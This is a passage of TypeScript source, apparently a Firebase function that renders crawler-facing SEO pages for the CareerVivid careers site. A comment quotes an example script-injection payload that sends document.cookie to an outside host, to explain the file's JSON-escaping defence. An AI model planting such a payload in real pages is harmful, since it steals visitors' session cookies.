import { onRequest } from "firebase-functions/v2/https";
import * as admin from "firebase-admin";
import { isbot } from "isbot";
import { algoliasearch } from "algoliasearch";
import { getLearningSeoPage, isLearningPageFree } from "./learningSeo";
import { getSearchPage, SEARCH_ORIGIN, SearchPageDefinition } from "./searchIndexPolicy";
import { MAX_PUBLIC_JOB_PAGES, readPublicJobs } from "../publicJobFeed";

const db = admin.firestore();

// ── index.html, fetched — deliberately NOT inlined at build time ──────────────
// Hosting rewrites /learning/** here, so every human pageview of a course page
// runs this function, and for a human it only serves index.html back.
//
// A previous version baked dist/index.html into the bundle at build time to
// avoid this fetch. That was wrong, and it broke production: index.html
// references Vite's CONTENT-HASHED asset URLs, so the inlined copy is only
// valid for the exact hosting build it was captured from. Deploy hosting again
// without redeploying this function and it keeps serving /assets/index-<old
// hash>.js, which no longer exists — Hosting's `** -> /index.html` rewrite then
// answers that request with HTML, and the browser reports:
//
//   Failed to load module script: Expected a JavaScript-or-Wasm module script
//   but the server responded with a MIME type of "text/html"
//
// The page renders blank on direct navigation while in-app navigation still
// works, because client-side routing never refetches the shell. Inlining
// silently couples this function to one hosting build; fetching cannot go
// stale. Correctness beats saving one request.
//
// The fetch is abort-guarded so a slow CDN can never hang the function to its
// timeout, and cached per instance so only the first request on a cold
// container pays for it. Instance recycling is what picks up a new deploy.
const INDEX_FETCH_TIMEOUT_MS = 5_000;

/*
 * The cache has to expire.
 *
 * Caching per instance with no TTL reintroduces the exact bug the comment above
 * describes, just delayed: a warm container keeps serving the index.html it
 * fetched on its first request, and a container can stay warm for hours. Every
 * deploy deletes the hashed chunks that shell names, so from the moment a
 * deploy lands until that instance happens to recycle, every route rewritten
 * here serves HTML whose scripts 404 — the browser gets the catch-all's
 * index.html back instead and refuses it as the wrong MIME type. The page is
 * blank and no reload fixes it, because nothing is wrong with the browser.
 *
 * A minute is short enough that a deploy self-heals before anyone files a bug,
 * and long enough that this is one extra fetch per instance per minute.
 */
const INDEX_CACHE_TTL_MS = 60_000;

let cachedIndexHtml: string | null = null;
let cachedIndexAt = 0;

async function getIndexHtml(): Promise<string> {
    if (cachedIndexHtml && Date.now() - cachedIndexAt < INDEX_CACHE_TTL_MS) return cachedIndexHtml;

    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), INDEX_FETCH_TIMEOUT_MS);
    try {
        const response = await fetch("https://careervivid.app/index.html", {
            headers: { "X-Internal-Fetch": "1" },
            signal: controller.signal,
        });
        if (!response.ok) throw new Error(`Failed to fetch index.html: ${response.status}`);
        cachedIndexHtml = await response.text();
        cachedIndexAt = Date.now();
        return cachedIndexHtml;
    } catch (error) {
        // A stale shell still boots the previous build for anyone whose chunks
        // survive; no shell at all is a hard 500. Prefer the stale one.
        if (cachedIndexHtml) return cachedIndexHtml;
        throw error;
    } finally {
        clearTimeout(timer);
    }
}

// ── Shared helpers ────────────────────────────────────────────────────────────
const DEFAULT_OG_IMAGE = "https://firebasestorage.googleapis.com/v0/b/jastalk-firebase.firebasestorage.app/o/public%2Flogo_assets%2Fog_image.png?alt=media";
const LOGO_URL = "https://firebasestorage.googleapis.com/v0/b/jastalk-firebase.firebasestorage.app/o/public%2Flogo_assets%2Flogo_light_mode.png?alt=media";
const BASE_URL = SEARCH_ORIGIN;

const esc = (s: string) => (s || "").replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

/*
 * JSON destined for a <script type="application/ld+json"> block.
 *
 * JSON.stringify alone is NOT safe here. It escapes what JSON needs escaped and
 * nothing else, so `<` and `/` come through verbatim — a resume summary, post
 * title or display name containing
 *
 *     </script><script>fetch('https://…?c='+document.cookie)</script>
 *
 * closes the block and runs on careervivid.app's own origin, with that origin's
 * cookies and localStorage. The HTML parser looks for the literal characters
 * `</script` before any JSON parsing happens, which is why the fix has to
 * happen at the character level.
 *
 * esc() is the WRONG tool: it emits HTML entities, and `&lt;` inside a JSON
 * string is just the four characters — the JSON-LD would be silently corrupted
 * and every consumer would read the entity text as content. A JSON string can
 * carry its own \uXXXX escapes instead, which the parser resolves back to the
 * original character, so the payload survives intact while `</script` can never
 * appear in the byte stream.
 *
 *   <, >   break out of the script block (and out of an HTML comment via `-->`)
 *   &      cannot start an entity here, but escaping it costs nothing and keeps
 *          the output inert if the block is ever moved to a parsed context
 *   U+2028, U+2029  legal raw inside JSON, but line terminators to older JS
 *                   parsers, which truncates the script
 *
 * Safe to chain: every replacement emits only [\\u0-9a-f], so no replacement
 * can produce a character a later replacement would re-escape. Backslashes in
 * the data were already doubled by JSON.stringify, so the sequences we add are
 * unambiguously ours.
 */
export const escapeJsonForHtml = (data: unknown): string => JSON.stringify(data)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");

const stripMarkdown = (md: string): string => (md || "")
    .replace(/```[\s\S]*?```/g, "")
    .replace(/!\[.*?\]\(.*?\)/g, "")
    .replace(/\[(.*?)\]\(.*?\)/g, "$1")
    .replace(/[#_*`[\]>~]/g, "")
    .replace(/\n+/g, " ")
    .trim();

export const buildHtml = ({
    title, description, canonicalUrl, imageUrl, structuredData, bodyContent, siteSuffix, indexable = true
}: {
    title: string; description: string; canonicalUrl: string; imageUrl: string;
    structuredData: object | object[]; bodyContent: string; siteSuffix: string; indexable?: boolean;
}) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>${esc(title)}${siteSuffix ? ` | ${esc(siteSuffix)}` : ""}</title>
  <meta name="description" content="${esc(description)}" />
  <meta name="robots" content="${indexable ? "index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1" : "noindex, follow"}" />
  <link rel="canonical" href="${esc(canonicalUrl)}" />
  <link rel="icon" href="${LOGO_URL}" />

  <!-- Open Graph -->
  <meta property="og:type" content="website" />
  <meta property="og:url" content="${esc(canonicalUrl)}" />
  <meta property="og:site_name" content="CareerVivid" />
  <meta property="og:title" content="${esc(title)}" />
  <meta property="og:description" content="${esc(description)}" />
  <meta property="og:image" content="${esc(imageUrl)}" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />

  <!-- Twitter -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="${esc(title)}" />
  <meta name="twitter:description" content="${esc(description)}" />
  <meta name="twitter:image" content="${esc(imageUrl)}" />

  <!-- Structured Data -->
  <script type="application/ld+json">${escapeJsonForHtml(structuredData)}</script>

</head>
<body>
  <!-- Semantic HTML served only to crawlers; human requests receive index.html. -->
  <div id="root">
    <main style="max-width:780px;margin:0 auto;padding:48px 24px;font-family:sans-serif;color:#111;">
      ${bodyContent}
    </main>
  </div>
</body>
</html>`;

// ── Route handlers ────────────────────────────────────────────────────────────

/** Sections and FAQs as real, readable HTML — see SearchPageSection. */
function renderSections(page: SearchPageDefinition): string {
    return (page.sections || []).map((section) => {
        const bullets = (section.bullets || []).length
            ? `<ul style="padding-left:20px;line-height:1.8;margin:12px 0 0;">${
                (section.bullets || []).map((b) => `<li>${esc(b)}</li>`).join("")
            }</ul>`
            : "";
        const body = section.body
            ? `<p style="line-height:1.7;color:#333;margin:0;">${esc(section.body)}</p>`
            : "";
        const links = (section.links || []).length
            ? `<p style="line-height:2;margin:12px 0 0;">${
                (section.links || []).map(({ href, label }) =>
                    `<a href="${BASE_URL}${href}" style="color:#4f46e5;font-weight:700;margin-right:14px;">${esc(label)}</a>`,
                ).join("")
            }</p>`
            : "";
        return `<section style="margin-top:36px;">
        <h2 style="font-size:1.4rem;font-weight:700;margin:0 0 10px;">${esc(section.heading)}</h2>
        ${body}${bullets}${links}
      </section>`;
    }).join("");
}

function renderFaqs(page: SearchPageDefinition): string {
    if (!page.faqs?.length) return "";
    const items = page.faqs.map((faq) => `<div style="margin-top:20px;">
        <h3 style="font-size:1.05rem;font-weight:700;margin:0 0 6px;">${esc(faq.question)}</h3>
        <p style="line-height:1.7;color:#333;margin:0;">${esc(faq.answer)}</p>
      </div>`).join("");
    return `<section style="margin-top:40px;">
        <h2 style="font-size:1.4rem;font-weight:700;margin:0;">Frequently asked questions</h2>
        ${items}
      </section>`;
}

function handleStaticPage(page: SearchPageDefinition): string {
    const canonicalUrl = `${BASE_URL}${page.path === "/" ? "/" : page.path}`;
    const indexable = page.indexable !== false;
    const links = (page.links || []).map(({ href, label }) =>
        `<li><a href="${BASE_URL}${href}" style="color:#4f46e5;font-weight:700;">${esc(label)}</a></li>`
    ).join("");

    const webPage = {
        "@context": "https://schema.org",
        "@type": "WebPage",
        "@id": `${canonicalUrl}#webpage`,
        name: page.title,
        description: page.description,
        url: canonicalUrl,
        isPartOf: { "@type": "WebSite", name: "CareerVivid", url: `${BASE_URL}/` },
    };

    /*
     * FAQPage markup is only emitted alongside the visible answers rendered
     * below. Google requires the answer be on the page for the rich result to
     * be eligible, and schema describing content that is not there is exactly
     * what earns a structured-data manual action.
     */
    const structuredData = page.faqs?.length
        ? [
            webPage,
            {
                "@context": "https://schema.org",
                "@type": "FAQPage",
                "@id": `${canonicalUrl}#faq`,
                mainEntity: page.faqs.map((faq) => ({
                    "@type": "Question",
                    name: faq.question,
                    acceptedAnswer: { "@type": "Answer", text: faq.answer },
                })),
            },
        ]
        : webPage;

    const bodyContent = `
        <nav aria-label="Breadcrumb" style="font-size:0.9rem;margin-bottom:20px;"><a href="${BASE_URL}/" style="color:#4f46e5;">CareerVivid</a></nav>
        <h1 style="font-size:2.2rem;font-weight:800;line-height:1.2;margin:0 0 16px;">${esc(page.heading)}</h1>
        <p style="font-size:1.1rem;color:#555;line-height:1.7;margin:0;">${esc(page.summary)}</p>
        ${renderSections(page)}
        ${renderFaqs(page)}
        ${links ? `<ul style="padding-left:20px;line-height:1.9;margin-top:28px;">${links}</ul>` : ""}
        <p style="margin-top:32px;"><a href="${canonicalUrl}" style="color:#4f46e5;font-weight:700;">Open ${esc(page.heading)} on CareerVivid</a></p>`;

    return buildHtml({
        title: page.title,
        description: page.description,
        canonicalUrl,
        imageUrl: DEFAULT_OG_IMAGE,
        structuredData,
        bodyContent,
        siteSuffix: "",
        indexable,
    });
}

async function handleArticle(postId: string): Promise<string> {
    const snap = await db.collection("community_posts").doc(postId).get();
    if (!snap.exists) throw new Error("not_found");
    const post = snap.data() as any;

    const title = post.title || "CareerVivid Article";
    const rawContent = stripMarkdown(post.content || "");
    const description = rawContent.substring(0, 160) || "Read this article on CareerVivid Community.";
    const imageUrl = post.coverImage || DEFAULT_OG_IMAGE;
    const canonicalUrl = `${BASE_URL}/community/post/${postId}`;
    const publishDate = post.createdAt?.toDate?.().toISOString() ?? new Date().toISOString();

    // Extract FAQs
    const faqs: any[] = [];
    const faqMatch = (post.content || "").match(/(?:^|\n)(?:#+)\s*Frequently Asked Questions\s*\n([\s\S]*)$/i);
    if (faqMatch) {
        const qnaRegex = /(?:\*\*Q:?|### Q:?|Q:?)\s*(.*?)\n(?:\*\*A:?|A:?)\s*(.*?)(?=\n(?:\*\*Q|### Q|Q)|$)/gs;
        let m;
        while ((m = qnaRegex.exec(faqMatch[1])) !== null) {
            if (m[1] && m[2]) faqs.push({ "@type": "Question", "name": m[1].trim(), "acceptedAnswer": { "@type": "Answer", "text": m[2].trim() } });
        }
    }

    const structuredData: any = {
        "@context": "https://schema.org",
        "@graph": [
            {
                "@type": "Article",
                "@id": `${canonicalUrl}#article`,
                headline: title.substring(0, 110),
                description,
                image: [imageUrl],
                datePublished: publishDate,
                author: { "@type": "Person", name: post.authorName || "CareerVivid Community" },
                publisher: { "@type": "Organization", name: "CareerVivid", logo: { "@type": "ImageObject", url: LOGO_URL } },
            }
        ]
    };
    if (faqs.length > 0) {
        structuredData["@graph"].push({ "@type": "FAQPage", "@id": `${canonicalUrl}#faq`, mainEntity: faqs });
    }

    const tags = (post.tags || []).map((t: string) => `<span style="margin-right:8px;color:#6366f1;">#${esc(t)}</span>`).join("");
    const bodyContent = `
        <h1 style="font-size:2.25rem;font-weight:800;line-height:1.2;margin-bottom:16px;">${esc(title)}</h1>
        ${tags ? `<p style="margin-bottom:16px;">${tags}</p>` : ""}
        <p style="font-size:1.1rem;color:#555;margin-bottom:24px;">${esc(description)}</p>
        <hr style="border:none;border-top:1px solid #eee;margin:24px 0;" />
        <p style="font-size:0.95rem;color:#777;line-height:1.7;">${esc(rawContent.substring(0, 2000))}</p>
    `;

    return buildHtml({ title, description, canonicalUrl, imageUrl, structuredData, bodyContent, siteSuffix: "CareerVivid Community" });
}

async function handleResume(uid: string, resumeId: string): Promise<string> {
    const snap = await db.collection("users").doc(uid).collection("resumes").doc(resumeId).get();
    if (!snap.exists) throw new Error("not_found");
    const resume = snap.data() as any;
    const pd = resume.personalDetails || {};

    const fullName = `${pd.firstName || ""} ${pd.lastName || ""}`.trim() || "CareerVivid Resume";
    const jobTitle = pd.jobTitle || "";
    const title = jobTitle ? `${fullName} – ${jobTitle}` : fullName;
    const summary = stripMarkdown(resume.professionalSummary || "");
    const description = summary.substring(0, 160) || `View ${fullName}'s professional resume on CareerVivid.`;
    const imageUrl = pd.photo || DEFAULT_OG_IMAGE;
    const canonicalUrl = `${BASE_URL}/shared/${uid}/${resumeId}`;

    const skills = (resume.skills || []).map((s: any) => esc(s.name)).join(", ");
    const jobs = (resume.employmentHistory || []).slice(0, 3).map((j: any) =>
        `<li><strong>${esc(j.jobTitle)}</strong> at ${esc(j.employer)} (${esc(j.startDate)} – ${esc(j.endDate || "Present")})</li>`
    ).join("");

    const structuredData = {
        "@context": "https://schema.org",
        "@type": "ProfilePage",
        name: `${fullName}'s Resume`,
        url: canonicalUrl,
        mainEntity: {
            "@type": "Person",
            name: fullName,
            jobTitle,
            description: summary.substring(0, 200),
        }
    };

    const bodyContent = `
        <h1 style="font-size:2rem;font-weight:800;margin-bottom:8px;">${esc(fullName)}</h1>
        ${jobTitle ? `<p style="font-size:1.1rem;color:#6366f1;font-weight:600;margin-bottom:16px;">${esc(jobTitle)}</p>` : ""}
        ${description ? `<p style="font-size:0.95rem;color:#555;margin-bottom:24px;">${esc(description)}</p>` : ""}
        ${skills ? `<p><strong>Skills:</strong> ${skills}</p>` : ""}
        ${jobs ? `<h2 style="font-size:1.1rem;font-weight:700;margin-top:24px;">Experience</h2><ul style="padding-left:20px;">${jobs}</ul>` : ""}
    `;

    return buildHtml({ title, description, canonicalUrl, imageUrl, structuredData, bodyContent, siteSuffix: "CareerVivid Resume" });
}

async function handlePortfolio(uid: string): Promise<string> {
    const snap = await db.collection("users").doc(uid).get();
    if (!snap.exists) throw new Error("not_found");
    const user = snap.data() as any;

    const portfolioSnap = await db.collection("users").doc(uid).collection("portfolio").limit(1).get();
    const portfolio = portfolioSnap.empty ? null : portfolioSnap.docs[0].data() as any;

    const name = user.displayName || portfolio?.personalInfo?.name || "CareerVivid Portfolio";
    const bio = portfolio?.personalInfo?.bio || user.bio || "";
    const title = `${name} – Portfolio`;
    const description = stripMarkdown(bio).substring(0, 160) || `View ${name}'s professional portfolio on CareerVivid.`;
    const imageUrl = user.photoURL || portfolio?.personalInfo?.avatar || DEFAULT_OG_IMAGE;
    const canonicalUrl = `${BASE_URL}/portfolio/${uid}`;

    const structuredData = {
        "@context": "https://schema.org",
        "@type": "ProfilePage",
        name: `${name}'s Portfolio`,
        url: canonicalUrl,
        mainEntity: {
            "@type": "Person",
            name,
            description: description,
            image: imageUrl,
        }
    };

    const bodyContent = `
        <h1 style="font-size:2rem;font-weight:800;margin-bottom:16px;">${esc(name)}</h1>
        ${description ? `<p style="font-size:1.05rem;color:#555;line-height:1.7;">${esc(description)}</p>` : ""}
    `;

    return buildHtml({ title, description, canonicalUrl, imageUrl, structuredData, bodyContent, siteSuffix: "CareerVivid Portfolio" });
}

async function handleWhiteboard(parts: string[]): Promise<string> {
    let whiteboardData: any = null;
    const whiteboardId = parts[parts.length - 1];

    const directSnap = await db.collection("whiteboards").doc(whiteboardId).get();
    if (directSnap.exists) {
        whiteboardData = directSnap.data();
    } else if (parts.length >= 2) {
        const uid = parts[parts.length - 2];
        const userSnap = await db.collection("users").doc(uid).collection("whiteboards").doc(whiteboardId).get();
        if (userSnap.exists) whiteboardData = userSnap.data();
    }

    if (!whiteboardData) throw new Error("not_found");

    const title = whiteboardData.title || "CareerVivid Whiteboard";
    const description = stripMarkdown(whiteboardData.description || "").substring(0, 160) || `View this whiteboard on CareerVivid.`;
    const imageUrl = whiteboardData.thumbnailUrl || DEFAULT_OG_IMAGE;
    const canonicalUrl = `${BASE_URL}/whiteboard/${whiteboardId}`;

    const structuredData = {
        "@context": "https://schema.org",
        "@type": "WebPage",
        name: title,
        description,
        url: canonicalUrl,
        image: imageUrl,
    };

    const bodyContent = `
        <h1 style="font-size:2rem;font-weight:800;margin-bottom:16px;">${esc(title)}</h1>
        ${description ? `<p style="font-size:1.05rem;color:#555;line-height:1.7;">${esc(description)}</p>` : ""}
    `;

    return buildHtml({ title, description, canonicalUrl, imageUrl, structuredData, bodyContent, siteSuffix: "CareerVivid Whiteboard" });
}

function handleLearningPage(slug?: string): string {
    const page = getLearningSeoPage(slug);

    // page.path, not the request path — an unrecognised slug renders the
    // catalog, and its canonical must point at /learning rather than claim the
    // URL that was asked for.
    const canonicalUrl = `${BASE_URL}${page.path}`;
    const isCatalog = page.path === "/learning";
    const courseSchema = isCatalog
        ? {
            "@type": "ItemList",
            name: "CareerVivid interactive courses",
            numberOfItems: 3,
            itemListElement: [
                { "@type": "ListItem", position: 1, name: "Coding Interview Patterns", url: `${BASE_URL}/learning/coding-interview-patterns` },
                { "@type": "ListItem", position: 2, name: "System Design Interview", url: `${BASE_URL}/learning/system-design-interview` },
                { "@type": "ListItem", position: 3, name: "AI Agent Builder Curriculum", url: `${BASE_URL}/learning/ai-agent-curriculum` },
            ],
        }
        : {
            "@type": "Course",
            "@id": `${canonicalUrl}#course`,
            name: page.heading,
            description: page.description,
            url: canonicalUrl,
            provider: { "@type": "Organization", name: "CareerVivid", url: `${BASE_URL}/` },
            educationalLevel: page.level,
            isAccessibleForFree: isLearningPageFree(slug),
            hasCourseInstance: { "@type": "CourseInstance", courseMode: "online" },
            teaches: page.topics,
            ...(isLearningPageFree(slug)
                ? { offers: { "@type": "Offer", price: "0", priceCurrency: "USD", category: "Free" } }
                : {}),
        };
    const structuredData: Record<string, unknown> = {
        "@context": "https://schema.org",
        "@graph": [
            {
                "@type": isCatalog ? "CollectionPage" : "WebPage",
                "@id": `${canonicalUrl}#webpage`,
                name: page.title,
                description: page.description,
                url: canonicalUrl,
                isPartOf: { "@type": "WebSite", name: "CareerVivid", url: `${BASE_URL}/` },
            },
            courseSchema,
            ...(isCatalog ? [] : [{
                "@type": "BreadcrumbList",
                itemListElement: [
                    { "@type": "ListItem", position: 1, name: "CareerVivid", item: `${BASE_URL}/` },
                    { "@type": "ListItem", position: 2, name: "Learning", item: `${BASE_URL}/learning` },
                    { "@type": "ListItem", position: 3, name: page.heading, item: canonicalUrl },
                ],
            }]),
            ...(page.faqs.length === 0 ? [] : [{
                "@type": "FAQPage",
                mainEntity: page.faqs.map(({ question, answer }) => ({
                    "@type": "Question",
                    name: question,
                    acceptedAnswer: { "@type": "Answer", text: answer },
                })),
            }]),
        ],
    };

    const topicList = page.topics.map((topic) => `<li>${esc(topic)}</li>`).join("");
    const faqList = page.faqs.map(({ question, answer }) => `
        <section>
          <h3 style="font-size:1rem;font-weight:700;margin:16px 0 4px;">${esc(question)}</h3>
          <p style="color:#555;line-height:1.6;margin:0;">${esc(answer)}</p>
        </section>`).join("");
    const courseLinks = isCatalog ? `
        <section style="margin-top:32px;">
          <h2 style="font-size:1.35rem;font-weight:800;">Available courses</h2>
          <article style="padding:16px 0;border-bottom:1px solid #eee;">
            <h3 style="font-size:1.05rem;margin:0 0 6px;"><a href="${BASE_URL}/learning/coding-interview-patterns" style="color:#4f46e5;">Coding Interview Patterns</a></h3>
            <p style="color:#555;line-height:1.6;margin:0;">20 algorithm patterns, 60 lessons, visual step-through animations, and runnable JavaScript code labs. Currently free to access.</p>
          </article>
          <article style="padding:16px 0;border-bottom:1px solid #eee;">
            <h3 style="font-size:1.05rem;margin:0 0 6px;"><a href="${BASE_URL}/learning/system-design-interview" style="color:#4f46e5;">System Design Interview</a></h3>
            <p style="color:#555;line-height:1.6;margin:0;">13 modules and 85 lessons: an answer framework, capacity estimation, caching, data at scale, async processing, multi-region reliability, real-time systems, and a senior capstone.</p>
          </article>
          <article style="padding:16px 0;">
            <h3 style="font-size:1.05rem;margin:0 0 6px;"><a href="${BASE_URL}/learning/ai-agent-curriculum" style="color:#4f46e5;">AI Agent Builder Curriculum</a></h3>
            <p style="color:#555;line-height:1.6;margin:0;">10 modules and 58 lessons from LLM foundations to a shipped AI agent portfolio project. The Foundations module is free to start.</p>
          </article>
        </section>` : "";
    const bodyContent = `
        <nav aria-label="Breadcrumb" style="font-size:0.9rem;margin-bottom:20px;"><a href="${BASE_URL}/learning" style="color:#4f46e5;">Learning</a>${isCatalog ? "" : ` / ${esc(page.heading)}`}</nav>
        <h1 style="font-size:2.2rem;font-weight:800;line-height:1.2;margin:0 0 12px;">${esc(page.heading)}</h1>
        <p style="font-size:1.1rem;color:#555;line-height:1.7;margin:0;">${esc(page.introduction)}</p>
        <dl style="display:grid;grid-template-columns:max-content 1fr;gap:8px 18px;margin:28px 0;padding:16px;background:#f8fafc;border-radius:8px;">
          <dt style="font-weight:700;">Format</dt><dd style="margin:0;">Self-paced online learning</dd>
          <dt style="font-weight:700;">Duration</dt><dd style="margin:0;">${esc(page.duration)}</dd>
          <dt style="font-weight:700;">Level</dt><dd style="margin:0;">${esc(page.level)}</dd>
          <dt style="font-weight:700;">Access</dt><dd style="margin:0;">${esc(page.access)}</dd>
        </dl>
        ${isCatalog ? "" : `<section><h2 style="font-size:1.35rem;font-weight:800;">What you will learn</h2><ul style="padding-left:20px;line-height:1.8;">${topicList}</ul></section>`}
        ${courseLinks}
        ${faqList ? `<section style="margin-top:32px;"><h2 style="font-size:1.35rem;font-weight:800;">Frequently asked questions</h2>${faqList}</section>` : ""}
        <p style="margin-top:32px;"><a href="${canonicalUrl}" style="color:#4f46e5;font-weight:700;">Open this interactive course on CareerVivid</a></p>`;

    return buildHtml({ title: page.title, description: page.description, canonicalUrl, imageUrl: DEFAULT_OG_IMAGE, structuredData, bodyContent, siteSuffix: "CareerVivid" });
}

// ── Community feed handler — serves a semantic article list to AI bots ────────
async function handleCommunityFeed(): Promise<string> {
    const appId = process.env.ALGOLIA_APP_ID;
    const searchKey = process.env.ALGOLIA_SEARCH_KEY;

    let articles: { id: string; title: string; author: string; snippet: string }[] = [];

    if (appId && searchKey) {
        try {
            const client = algoliasearch(appId, searchKey);
            const result = await client.search({
                requests: [{
                    indexName: "community_posts",
                    query: "",
                    hitsPerPage: 20,
                    attributesToRetrieve: ["objectID", "title", "authorName", "content", "type"],
                }]
            });
            const firstResult = (result.results[0] as any);
            const hits: any[] = firstResult?.hits ?? [];
            articles = hits
                .filter((h: any) => !h.type || h.type === "article")
                .map((h: any) => ({
                    id: h.objectID,
                    title: (h.title || "Untitled Article").trim(),
                    author: h.authorName || "CareerVivid Community",
                    snippet: stripMarkdown(h.content || "").substring(0, 120),
                }));
        } catch (err) {
            console.warn("[handleCommunityFeed] Algolia query failed:", err);
        }
    } else {
        console.warn("[handleCommunityFeed] Missing ALGOLIA_APP_ID or ALGOLIA_SEARCH_KEY.");
    }

    const title = "CareerVivid Community – Career Articles & Resources";
    const description = "Explore the latest career advice, resume tips, portfolio showcases, and professional development articles from the CareerVivid community.";
    const canonicalUrl = `${BASE_URL}/community`;

    const structuredData = {
        "@context": "https://schema.org",
        "@type": "CollectionPage",
        name: title,
        description,
        url: canonicalUrl,
        publisher: { "@type": "Organization", name: "CareerVivid", logo: { "@type": "ImageObject", url: LOGO_URL } },
        hasPart: articles.map(a => ({
            "@type": "Article",
            name: a.title,
            url: `${BASE_URL}/community/post/${a.id}`,
            author: { "@type": "Person", name: a.author },
        }))
    };

    const listItems = articles.length > 0
        ? articles.map(a => `
    <li style="padding:14px 0;border-bottom:1px solid #f0f0f0;">
      <a href="${BASE_URL}/community/post/${esc(a.id)}" style="font-size:1rem;font-weight:600;color:#4f46e5;text-decoration:none;">
        ${esc(a.title)}
      </a>
      <p style="margin:4px 0 0;font-size:0.85rem;color:#888;">${esc(a.author)}${a.snippet ? " · " + esc(a.snippet) + "…" : ""}</p>
    </li>`).join("")
        : `<li style="color:#888;padding:16px 0;">No articles found.</li>`;

    const bodyContent = `
        <h1 style="font-size:2rem;font-weight:800;margin-bottom:8px;">${esc(title)}</h1>
        <p style="font-size:1rem;color:#555;margin-bottom:24px;">${esc(description)}</p>
        <ul style="list-style:none;padding:0;margin:0;">${listItems}
        </ul>
        <p style="margin-top:24px;font-size:0.85rem;color:#aaa;">
          <a href="${BASE_URL}/community" style="color:#4f46e5;">View all articles →</a>
        </p>`;

    return buildHtml({ title, description, canonicalUrl, imageUrl: DEFAULT_OG_IMAGE, structuredData, bodyContent, siteSuffix: "CareerVivid" });
}

/**
 * The public job list, with the actual jobs in the HTML.
 *
 * A client-fetched list is invisible: the crawler receives an empty grid and a
 * spinner, so the page ranks on its boilerplate and nothing else. The listings
 * are read here, server-side, from the SAME function the browser calls — if the
 * two ever diverged, the HTML shown to Google would not be the page a person
 * gets, which is cloaking whether or not anyone meant it that way.
 *
 * Deliberately no JobPosting structured data. These listings are collected from
 * employers' own boards, and Google requires the site claiming JobPosting to be
 * the authoritative source or to have permission. Marking them up would put a
 * manual action at risk for traffic that is not ours to claim. The page still
 * ranks as an ordinary results page.
 */
async function handleJobsList(pageParam: string | undefined): Promise<string> {
    const page = getSearchPage("/jobs");
    if (!page) throw new Error("not_found");

    const requested = Number(pageParam);
    const pageNumber = Number.isFinite(requested) && requested >= 1
        ? Math.min(Math.floor(requested), MAX_PUBLIC_JOB_PAGES)
        : 1;

    const { jobs, totalPages } = await readPublicJobs(pageNumber);

    // Page one lives at /jobs, never /jobs/1 — two URLs with the same results is
    // a duplicate Google has to choose between.
    const pathFor = (n: number) => (n <= 1 ? "/jobs" : `/jobs/${n}`);
    const canonicalUrl = `${BASE_URL}${pathFor(pageNumber)}`;

    const listItems = jobs.length
        ? jobs.map((job) => {
            const facts = [job.location, job.workModel, job.jobType, job.seniority, job.salary]
                .filter(Boolean).join(" · ");
            return `<li style="padding:16px 0;border-bottom:1px solid #eee;">
        <h3 style="margin:0 0 4px;font-size:1.05rem;font-weight:700;">${esc(job.title)}</h3>
        <p style="margin:0;color:#555;font-weight:600;">${esc(job.company)}</p>
        ${facts ? `<p style="margin:4px 0 0;color:#777;font-size:0.9rem;">${esc(facts)}</p>` : ""}
        ${job.description ? `<p style="margin:8px 0 0;color:#333;line-height:1.6;">${esc(job.description)}</p>` : ""}
      </li>`;
        }).join("")
        : `<li style="color:#888;padding:16px 0;">No open roles on this page right now.</li>`;

    const pager = totalPages > 1
        ? `<nav aria-label="Job list pages" style="margin-top:28px;">${
            Array.from({ length: totalPages }, (_, i) => i + 1)
                .map((n) => n === pageNumber
                    ? `<span style="margin-right:10px;font-weight:700;">${n}</span>`
                    : `<a href="${BASE_URL}${pathFor(n)}" style="margin-right:10px;color:#4f46e5;font-weight:700;">${n}</a>`)
                .join("")
        }</nav>`
        : "";

    const heading = pageNumber > 1 ? `${page.heading} — page ${pageNumber}` : page.heading;
    const title = pageNumber > 1 ? `Open Jobs — Page ${pageNumber} | CareerVivid` : page.title;

    const collectionPage = {
        "@context": "https://schema.org",
        "@type": "CollectionPage",
        name: title,
        description: page.description,
        url: canonicalUrl,
        publisher: { "@type": "Organization", name: "CareerVivid", logo: { "@type": "ImageObject", url: LOGO_URL } },
    };

    /*
     * The FAQ answers are rendered below by renderFaqs, so the markup describes
     * content that is actually on the page. Building structuredData by hand
     * here meant this was the one page that showed the questions and claimed
     * nothing for them — every other page emits both.
     *
     * Only page one: the same questions repeated on /jobs/2 would be duplicate
     * markup competing with itself for one rich result.
     */
    const structuredData = page.faqs?.length && pageNumber === 1
        ? [
            collectionPage,
            {
                "@context": "https://schema.org",
                "@type": "FAQPage",
                "@id": `${canonicalUrl}#faq`,
                mainEntity: page.faqs.map((faq) => ({
                    "@type": "Question",
                    name: faq.question,
                    acceptedAnswer: { "@type": "Answer", text: faq.answer },
                })),
            },
        ]
        : collectionPage;

    const bodyContent = `
        <nav aria-label="Breadcrumb" style="font-size:0.9rem;margin-bottom:20px;"><a href="${BASE_URL}/" style="color:#4f46e5;">CareerVivid</a></nav>
        <h1 style="font-size:2.2rem;font-weight:800;line-height:1.2;margin:0 0 16px;">${esc(heading)}</h1>
        <p style="font-size:1.1rem;color:#555;line-height:1.7;margin:0;">${esc(page.summary)}</p>
        <ul style="list-style:none;padding:0;margin:28px 0 0;">${listItems}</ul>
        ${pager}
        ${renderSections(page)}
        ${renderFaqs(page)}
        ${(page.links || []).length ? `<ul style="padding-left:20px;line-height:1.9;margin-top:28px;">${
            (page.links || []).map(({ href, label }) =>
                `<li><a href="${BASE_URL}${href}" style="color:#4f46e5;font-weight:700;">${esc(label)}</a></li>`).join("")
        }</ul>` : ""}`;

    return buildHtml({
        title,
        description: page.description,
        canonicalUrl,
        imageUrl: DEFAULT_OG_IMAGE,
        structuredData,
        bodyContent,
        siteSuffix: "",
    });
}

// ── Main Function ─────────────────────────────────────────────────────────────
export const renderSeoContent = onRequest(
    {
        region: "us-west1",
        memory: "512MiB",
        timeoutSeconds: 30,
    },
    async (req, res) => {
        const ua = (req.headers["user-agent"] || "").toString();
        const path = req.path || "/";
